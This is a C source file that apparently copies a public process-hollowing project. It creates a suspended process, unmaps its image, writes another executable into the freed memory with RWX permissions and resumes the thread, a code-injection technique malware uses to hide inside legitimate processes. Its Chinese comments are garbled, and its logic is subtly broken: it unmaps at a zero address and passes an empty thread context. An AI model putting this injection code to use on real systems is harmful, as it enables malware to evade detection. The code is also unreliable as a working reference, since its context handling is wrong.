// COPY https://github.com/m0n0ph1/Process-Hollowing
#include<stdio.h>

#include".\\..\\..\\PE_HANDLE_LIB\\pe.h"
#include".\\..\\..\\PE_HANDLE_LIB\\_global.h"


typedef NTSTATUS (WINAPI* _NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

/*
1.�Թ���ķ�ʽ����һ������
2.ж�ظý��̵��ڴ�ӳ�䣬���Ϳոý��������ڴ�ռ��е�����
3.��ȡ�ý��̵�CONTEXT�����Ľṹ
4.��Ҫע��ĳ�����뵽�ڴ���
5.�ڿ��ܽ����������㹻���ڴ�ռ�
6.�ֶ���Ҫע��ĳ���д����ܽ�������������ڴ�ռ�
6.����CONTEXT�����ĵ�EaxΪ������ڵ㣬Ebx+8Ϊ�����ַ
7.�ָ��߳�
*/

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFileName)
{
	DEBUG_INFO("[+]Creating Process\r\n");

	BOOL bResult = FALSE;
	STARTUPINFOA StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInformation = { 0 };

	CONTEXT context = { 0 };
	ULONG_PTR ulImageBase = 0;
	DWORD dwFileSize = 0;
	DWORD dwSizeOfImage = 0;


	//memory of source file 
	LPVOID lpSourceFile = NULL;
	LPVOID lpExpendFile = NULL;

	StartupInfo.cb = sizeof(StartupInfo);
	do
	{
		//��������Ľ���
		if ( !CreateProcessA(
			0,
			pDestCmdLine,
			0,
			0,
			FALSE,
			CREATE_SUSPENDED,
			0,
			0,
			&StartupInfo,
			&ProcessInformation
		) ) {
			DEBUG_ERROR("[-] ����ʧ��");
			break;
		}


		DEBUG_INFO("[+] ZwNtUnMapViewOfSection");
		FARPROC pfnZwUnmapViewOfSecrtion = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
		if ( !pfnZwUnmapViewOfSecrtion ) {
			DEBUG_ERROR("[-] GetAddress NtUnmapViewOfSection Error");
		}
		_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)pfnZwUnmapViewOfSecrtion;

		//unmap image
		NtUnmapViewOfSection(ProcessInformation.hProcess, (PVOID)ulImageBase);

		//ReadFile
		lpSourceFile = MyReadFile(pSourceFileName, &dwFileSize, 0);
		if ( lpSourceFile == NULL ) {
			DEBUG_ERROR("[-] ReadFile Error");
			break;
		}
		//�����㹻�Ŀռ�
		dwSizeOfImage = GetSizeOfImage((PIMAGE_DOS_HEADER)lpSourceFile);
		lpExpendFile = VirtualAllocEx(ProcessInformation.hProcess, GetImageBase((PIMAGE_DOS_HEADER)lpSourceFile), dwSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		//PE�޸�
		DEBUG_INFO("[+] Start Copy PE");
		AcrossCopyHeader(ProcessInformation.hProcess, lpExpendFile, (PIMAGE_DOS_HEADER)lpSourceFile);
		AcrossCopyAllSection (ProcessInformation.hProcess, lpExpendFile, (PIMAGE_DOS_HEADER)lpSourceFile, dwSizeOfImage);

		//DEBUG_INFO("[+]Start Fix IAT and RELOC");
		//ShellCodeRepairImportTable((PIMAGE_DOS_HEADER)lpExpendFile, GetProcAddress, LoadLibraryA);
		//ShellCodeFixReloc((PIMAGE_DOS_HEADER)lpExpendFile, (PIMAGE_DOS_HEADER)pSourceFileName);


		DEBUG_INFO("[+]Setting EntryPoint");
		CONTEXT newcontext = { 0 };
		newcontext.ContextFlags = CONTEXT_INTEGER;
		DWORD dwImageBase = (DWORD)lpExpendFile;

#ifdef _WIN64
		context.Rax = GetAddressOfEntryPoint(ProcessInformation.hProcess,(PIMAGE_DOS_HEADER)lpExpendFile);
#else
		context.Eax = GetAddressOfEntryPoint(ProcessInformation.hProcess,(PIMAGE_DOS_HEADER)lpExpendFile);
		WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)( context.Ebx + 0x8 ), &dwImageBase, sizeof(DWORD), 0);
#endif

		DEBUG_INFO("[+]Setting Context");
		if ( !SetThreadContext(ProcessInformation.hThread, &newcontext) ) {
			DEBUG_ERROR("[-] SetThreadContext Error");
			break;
		}

		DEBUG_INFO("[+]Resume Context");
		if ( !ResumeThread(ProcessInformation.hThread) ) {
			DEBUG_ERROR("[-] SetThreadContext Error");
			break;
		}


	} while ( 0 );


	//avoid leak process handle
	//if ( ProcessInformation.hProcess != 0 || ProcessInformation.hThread != 0 )
	//{
	//	CloseHandle(ProcessInformation.hProcess);
	//	CloseHandle(ProcessInformation.hThread);
	//}
}

int main(int argc, char* argv[])
{

	CreateHollowedProcess("pause.exe", "HelloWorld.exe");
	system("pause");
	return	0;
}